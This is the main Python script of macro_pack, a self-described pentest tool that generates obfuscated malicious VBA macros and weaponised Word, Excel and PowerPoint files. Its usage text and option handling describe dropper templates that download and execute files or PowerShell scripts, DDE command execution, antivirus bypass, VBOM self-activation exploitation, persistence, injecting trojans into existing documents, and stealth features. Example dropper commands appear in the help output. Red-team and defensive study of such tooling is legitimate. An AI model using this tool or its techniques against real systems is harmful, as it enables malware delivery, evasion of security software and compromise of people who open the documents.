#!/usr/bin/python3
# encoding: utf-8

import os
import sys
import getopt
import logging
import shutil
from modules.obfuscate_names import ObfuscateNames
from modules.obfuscate_form import ObfuscateForm
from modules.obfuscate_strings import ObfuscateStrings
from modules.excel_gen import ExcelGenerator
from modules.word_gen import WordGenerator
from modules.ppt_gen import PowerPointGenerator
from modules.template_gen import TemplateToVba
from modules.vba_gen import VBAGenerator
from modules.word_dde import WordDDE

from common import utils, mp_session
from _ast import arg
from modules import mp_module
if sys.platform == "win32":
    try:
        import win32com.client # @UnresolvedImport
    except:
        print("Error: Could not find win32com. You have to download pywin32 at https://sourceforge.net/projects/pywin32/files/pywin32/")
        sys.exit(1)
MP_TYPE="Pro"
try:
    from pro_modules.vbom_encode import VbomEncoder
    from pro_modules.persistance import Persistance
    from pro_modules.av_bypass import AvBypass
    from pro_modules.excel_trojan import ExcelTrojan
    from pro_modules.word_trojan import WordTrojan
    from pro_modules.ppt_trojan import PptTrojan
    from pro_modules.stealth import Stealth
except:
    MP_TYPE="Community"

from colorama import init
from termcolor import colored

# use Colorama to make Termcolor work on Windows too
init()


WORKING_DIR = "temp"
VERSION="1.2-dev"
BANNER = """\

  _  _   __    ___  ____   __     ____   __    ___  __ _ 
 ( \/ ) / _\  / __)(  _ \ /  \   (  _ \ / _\  / __)(  / )
 / \/ \/    \( (__  )   /(  O )   ) __//    \( (__  )  ( 
 \_)(_/\_/\_/ \___)(__\_) \__/   (__)  \_/\_/ \___)(__\_)
    

   Pentest with MS Office VBA - Version:%s Release:%s 
                                                                                           
""" % (VERSION, MP_TYPE)


def usage():
    print(colored(BANNER, 'green'))
    print(" Usage 1: %s  -f input_file_path [options] " % sys.argv[0])
    print(" Usage 2: cat input_file_path | %s [options] " %sys.argv[0])
    proDetails = ""
    if MP_TYPE == "Pro":
        proDetails = \
"""
    --vbom-encode   Use VBA self encoding to bypass antimalware detection and enable VBOM access (will exploit VBOM self activation vuln). 
                  --start-function option may be needed.
    --av-bypass  Use various tricks  efficient to bypass most av (combine with -o for best result)
    --keep-alive    Use with --vbom-encode option. Ensure new app instance will stay alive even when macro has finished
    --persist       Use with --vbom-encode option. Macro will automatically be persisted in application startup path 
                    (works with Excel documents only). The macro will be then be executed anytime an Excel document is opened.
    --trojan       Inject macro in an existing MS office file. Use in conjunction with -x, -X, -w, or -W
    --stealth      Anti-debug and hiding features
"""

    details = \
"""
 All options:
    -f, --input-file=INPUT_FILE_PATH A VBA macro file or file containing params for --template option 
        If no input file is provided, input must be passed via stdin (using a pipe).
    -q, --quiet     Do not display anything on screen, just process request. 
    -o, --obfuscate Obfuscate macro Destroy document readability by changing form,names, and strings
                    Same as '--obfuscate-form --obfuscate-names --obfuscate-strings'
    --obfuscate-form  Modify readability by removing all spaces and comments in VBA
    --obfuscate-strings  Randomly split strings and encode them
    --obfuscate-names Change functions, variables, and constants names  
    -s, --start-function=START_FUNCTION   Entry point of macro file 
        Note that macro_pack will automatically detect AutoOpen, Workbook_Open, or Document_Open  as the start function
    -t, --template=TEMPLATE_NAME 
        Available templates:
            HELLO   -> Just print a hello message and awareness about macro
                    -> Example use: echo "@Author" | %s -t HELLO -P hello.pptm
            DROPPER -> Download and exec file
                    -> Example use:  echo <file_to_drop_url> "<download_path>" | %s -t DROPPER -o -x dropper.xls
            DROPPER2 -> Download and exec file. File attributes are also set to system, read-only, and hidden
                    -> Example use:  echo <file_to_drop_url> "<download_path>" | %s -t DROPPER2 -o -X dropper.xlsm
            DROPPER_PS -> Download and execute Powershell script using rundll32 (to bypass blocked powershell.exe)
                    -> Example use:  echo "<powershell_script_url>" | %s -t DROPPER_PS -o -w powpow.doc
                    Note: This payload will download PowerShdll from Github.
    -v, --vba-output=VBA_FILE_PATH Output generated vba macro (text format) to given path.         
""" % (sys.argv[0],sys.argv[0],sys.argv[0],sys.argv[0])   

    details +=proDetails

    # Only enabled on windows
    if sys.platform == "win32":
        details += \
"""
    -X, --excel-output=EXCEL_FILE_PATH \t Generates MS Excel (*.xlsm) file.
    -x, --excel97-output=EXCEL_FILE_PATH \t Generates MS Excel 97-2003 (*.xls) file.
    -W, --word-output=WORD_FILE_PATH \t Generates MS Word (.docm) file.
    -w, --word97-output=WORD_FILE_PATH \t Generates MS Word 97-2003 (.doc) file.
    -P --ppt-output=PPT_FILE_PATH \t Generates MS PowerPoint (.pptm) file.
    --dde \t  Dynamic Data Exchange attack mode. Input will be inserted as a cmd command and executed via DDE
         DDE attack mode is not compatible with VBA Macro related options.
         Usage: echo calc.exe | %s --dde -W DDE.docx
"""  % (sys.argv[0])
    details +="    -h, --help   Displays help and exit"
    details += \
"""

 Notes:
    If no output file is provided, the result will be displayed on stdout.
    Combine this with -q option to pipe only processed result into another program
    ex: %s -f my_vba.vba -o -q | another_app
    Another valid usage is:
    cat input_file.vba | %s -o -q  > output_file.vba 
    
  Have a look at README.md file for more details and usage!
    
""" % (sys.argv[0],sys.argv[0])   
    print(details)
    

def main(argv):   
    
    logLevel = "INFO"
    # initialize macro_pack session object
    mpSession = mp_session.MpSession(WORKING_DIR, VERSION)
         
    try:
        longOptions = ["quiet", "input-file=","vba-output=", "mask-strings", "encode","obfuscate","obfuscate-form", "obfuscate-names", "obfuscate-strings", "file=","template=", "start-function=", "dde"] 
        # only for Pro release
        if MP_TYPE == "Pro":
            longOptions.extend(["vbom-encode", "persist","keep-alive", "av-bypass", "trojan", "stealth"])
        
        # Only enabled on windows
        if sys.platform == "win32":
            longOptions.extend(["excel-output=", "word-output=", "excel97-output=", "word97-output=", "ppt-output="])
            
        opts, args = getopt.getopt(argv, "s:f:t:v:x:X:w:W:P:hqmo", longOptions) # @UnusedVariable
    except getopt.GetoptError:          
        usage()                         
        sys.exit(2)                  
    for opt, arg in opts:                
        if opt in ("-o", "--obfuscate"):                 
            mpSession.obfuscateForm =  True  
            mpSession.obfuscateNames =  True 
            mpSession.obfuscateStrings =  True 
        elif opt=="--obfuscate-form":                 
            mpSession.obfuscateForm =  True  
        elif opt=="--obfuscate-names":                 
            mpSession.obfuscateNames =  True    
        elif opt=="--obfuscate-strings":                 
            mpSession.obfuscateStrings =  True                
        elif opt=="-s" or opt=="--start-function":                 
            mpSession.startFunction =  arg         
        elif opt == "-f" or opt== "--input-file": 
            mpSession.vbaInput = arg
        elif opt=="-t" or opt=="--template": 
            mpSession.template = arg
        elif opt=="-q" or opt=="--quiet": 
            logLevel = "ERROR"
        elif opt=="-v" or opt=="--vba-output": 
            mpSession.vbaFilePath = os.path.abspath(arg)
            mpSession.fileOutput = True
        elif opt == "--dde":
            if sys.platform == "win32":
                mpSession.ddeMode = True
        elif opt in ("-X", "--excel-output"): 
            # Only enabled on windows
            if sys.platform == "win32":
                mpSession.excelFilePath = os.path.abspath(arg)
                mpSession.fileOutput = True
        elif opt in ("-W","--word-output"): 
            # Only enabled on windows
            if sys.platform == "win32":
                mpSession.wordFilePath = os.path.abspath(arg)
                mpSession.fileOutput = True
        elif opt in ("-x", "--excel97-output"): 
            # Only enabled on windows
            if sys.platform == "win32":
                mpSession.excel97FilePath = os.path.abspath(arg)
                mpSession.fileOutput = True
        elif opt in ("-w", "--word97-output"): 
            # Only enabled on windows
            if sys.platform == "win32":
                mpSession.word97FilePath = os.path.abspath(arg)
                mpSession.fileOutput = True
        elif opt in ("-P","--ppt-output"):
            # Only enabled on windows
            if sys.platform == "win32":
                mpSession.pptFilePath = os.path.abspath(arg)
                mpSession.fileOutput = True
        elif opt=="-h" or opt=="--help": 
            usage()                         
            sys.exit(0)
        else:
            if MP_TYPE == "Pro":  
                if opt=="--vbom-encode":      
                    mpSession.vbomEncode = True               
                elif opt=="--persist": 
                    mpSession.persist = True       
                elif opt=="--keep-alive": 
                    mpSession.keepAlive = True  
                elif opt=="--av-bypass":
                    mpSession.avBypass = True
                elif opt=="--trojan":
                    mpSession.trojan = True
                elif opt == "--stealth":
                    mpSession.stealth = True
                else:
                    usage()                         
                    sys.exit(0)
            else:
                usage()                         
                sys.exit(0)
                    
    
    os.system('cls' if os.name == 'nt' else 'clear')
    # Logging
    logging.basicConfig(level=getattr(logging, logLevel),format="%(message)s", handlers=[utils.ColorLogFiler()])
    

    logging.info(colored(BANNER, 'green'))

    logging.info(" [+] Preparations...") 
    # check input args
    if mpSession.vbaInput is None:
        # Argument not supplied, try to get file content from stdin
        if os.isatty(0) == False: # check if something is being piped
            logging.info("   [-] Waiting for piped input feed...")  
            mpSession.stdinContent = sys.stdin.readlines()
        else:
            logging.error("   [!] ERROR: No input provided")                        
            sys.exit(2)
    else:
        if not os.path.isfile(mpSession.vbaInput):
            logging.error("   [!] ERROR: Could not find %s!" % mpSession.vbaInput)
            sys.exit(2)
    
    if mpSession.trojan==False:
        # verify that output file does not already exist
        for outputPath in [mpSession.vbaFilePath, mpSession.excelFilePath, mpSession.wordFilePath, mpSession.excel97FilePath, mpSession.word97FilePath, mpSession.pptFilePath]:
            if outputPath is not None:
                if os.path.isfile(outputPath):
                    logging.error("   [!] ERROR: Output file %s already exist!" % outputPath)
                    sys.exit(2)
    else:
        # In trojan mod, file are tojane if they already exist and created if they dont.
        # except for vba output which is not concerned by trojan feature
        for outputPath in [mpSession.vbaFilePath]:
            if outputPath is not None:
                if os.path.isfile(outputPath):
                    logging.error("   [!] ERROR: Output file %s already exist!" % outputPath)
                    sys.exit(2)
    
    logging.info("   [-] Input file path: %s" % mpSession.vbaInput)
    #Create temporary folder
    logging.info("   [-] Temporary working dir: %s" % WORKING_DIR)
    if not os.path.exists(WORKING_DIR):
        os.makedirs(WORKING_DIR)

    
    try:

        logging.info("   [-] Store input file..." )
        # Create temporary work file.
        if mpSession.ddeMode:
            inputFile = os.path.join(WORKING_DIR,"command.cmd")
        else:
            inputFile = os.path.join(WORKING_DIR,utils.randomAlpha(9))+".vba"
        if mpSession.stdinContent is not None: 
            f = open(inputFile, 'w')
            f.writelines(mpSession.stdinContent)
            f.close()    
        else:
            # Create temporary work file
            shutil.copy2(mpSession.vbaInput, inputFile)
        logging.info("   [-] Temporary file: %s" %  inputFile)
        
        if mpSession.ddeMode: # DDE Attack mode
            if mpSession.wordFilePath or mpSession.word97FilePath:
                generator = WordDDE(mpSession)
                generator.run()
        else: # VBA macro mode
               
            # Generate template
            if mpSession.template:
                generator = TemplateToVba(mpSession)
                generator.run()
                
            # Macro obfuscation
            if mpSession.obfuscateNames:
                obfuscator = ObfuscateNames(mpSession)
                obfuscator.run()
            # Mask strings
            if mpSession.obfuscateStrings:
                obfuscator = ObfuscateStrings(mpSession)
                obfuscator.run()
            # Macro obfuscation
            if mpSession.obfuscateForm:
                obfuscator = ObfuscateForm(mpSession)
                obfuscator.run()     
            
            if MP_TYPE == "Pro":
                #macro split
                if mpSession.avBypass:
                    obfuscator = AvBypass(mpSession)
                    obfuscator.run() 
                    
                # MAcro encoding    
                if mpSession.vbomEncode:
                    obfuscator = VbomEncoder(mpSession)
                    obfuscator.run() 
                        
                    # PErsistance management
                    if mpSession.persist:
                        obfuscator = Persistance(mpSession)
                        obfuscator.run() 
                    # Macro obfuscation
                    if mpSession.obfuscateNames:
                        obfuscator = ObfuscateNames(mpSession)
                        obfuscator.run()
                    # Mask strings
                    if mpSession.obfuscateStrings:
                        obfuscator = ObfuscateStrings(mpSession)
                        obfuscator.run()
                    # Macro obfuscation
                    if mpSession.obfuscateForm:
                        obfuscator = ObfuscateForm(mpSession)
                        obfuscator.run()  
                else:
                    # PErsistance management
                    if mpSession.persist:
                        obfuscator = Persistance(mpSession)
                        obfuscator.run() 
                                          
            # MS Office generation/trojan is only enabled on windows
            if sys.platform == "win32":
                
                if mpSession.stealth == True:
                    # Add a new empty module to keep VBA library if we hide other modules
                    # See http://seclists.org/fulldisclosure/2017/Mar/90
                    genericModule = mp_module.MpModule(mpSession)
                    genericModule.addVBAModule("")
            
                if mpSession.trojan == False:
                    if mpSession.excelFilePath or mpSession.excel97FilePath:
                        generator = ExcelGenerator(mpSession)
                        generator.run()
                    if mpSession.wordFilePath or mpSession.word97FilePath:
                        generator = WordGenerator(mpSession)
                        generator.run()
                    if mpSession.pptFilePath:
                        generator = PowerPointGenerator(mpSession)
                        generator.run()
                else:
                    if mpSession.excelFilePath:
                        if os.path.isfile(mpSession.excelFilePath):
                            generator = ExcelTrojan(mpSession)
                            generator.run()
                        else:
                            generator = ExcelGenerator(mpSession)
                            generator.run()
                    if mpSession.excel97FilePath:
                        if os.path.isfile(mpSession.excel97FilePath):
                            generator = ExcelTrojan(mpSession)
                            generator.run()
                        else:
                            generator = ExcelGenerator(mpSession)
                            generator.run()
                    if mpSession.wordFilePath:
                        if os.path.isfile(mpSession.wordFilePath):
                            generator = WordTrojan(mpSession)
                            generator.run()
                        else:
                            generator = WordGenerator(mpSession)
                            generator.run()
                    if mpSession.word97FilePath:
                        if os.path.isfile(mpSession.word97FilePath):
                            generator = WordTrojan(mpSession)
                            generator.run()
                        else:
                            generator = WordGenerator(mpSession)
                            generator.run()
                    if mpSession.pptFilePath:
                        if os.path.isfile(mpSession.pptFilePath):
                            generator = PptTrojan(mpSession)
                            generator.run()
                        else:
                            generator = PowerPointGenerator(mpSession)
                            generator.run()
    
                if mpSession.stealth == True:
                    obfuscator = Stealth(mpSession)
                    obfuscator.run()
        
            if mpSession.vbaFilePath is not None or mpSession.fileOutput == False:
                generator = VBAGenerator(mpSession)
                generator.run()
    except Exception:
        logging.exception(" [!] Exception caught!")
        logging.error(" [!] Hints: Check if MS office is really closed and Antivirus did not catch the files")
        if sys.platform == "win32":
            logging.error(" [!] Attempt to force close MS Office applications...")
            objExcel = win32com.client.Dispatch("Excel.Application")
            objExcel.Application.Quit()
            del objExcel
            objWord = win32com.client.Dispatch("Word.Application")
            objWord.Application.Quit()
            del objWord
            ppt = win32com.client.Dispatch("PowerPoint.Application")
            ppt.Quit()
            del ppt
     
    logging.info(" [+] Cleaning...")
    shutil.rmtree(WORKING_DIR)   
    logging.info(" Done!\n")
        
    
    sys.exit(0)


if __name__ == '__main__':
    main(sys.argv[1:])
    
    